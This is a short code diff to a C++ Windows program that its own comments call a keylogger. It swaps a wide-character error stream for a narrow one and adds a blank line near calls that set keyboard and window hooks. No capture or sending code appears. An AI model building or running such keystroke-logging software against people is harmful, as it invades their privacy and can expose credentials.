@@ -14,7 +14,7 @@ static bool isTestModeSet(int argc, wchar_t *argv[])
             return true;
         else
         {
-            std::wcerr << L"Error: Unknown argument.\n";
+            std::cerr << "Error: Unknown argument.\n";
             exit(1);
         }
     }
@@ -29,6 +29,7 @@ int wmain(int argc, wchar_t *argv[])
     try {
         // Set the hooks to the window and keyboard events
         w->setHooks();
+
         // Run the keylogger
         w->run(isTestMode);
     }
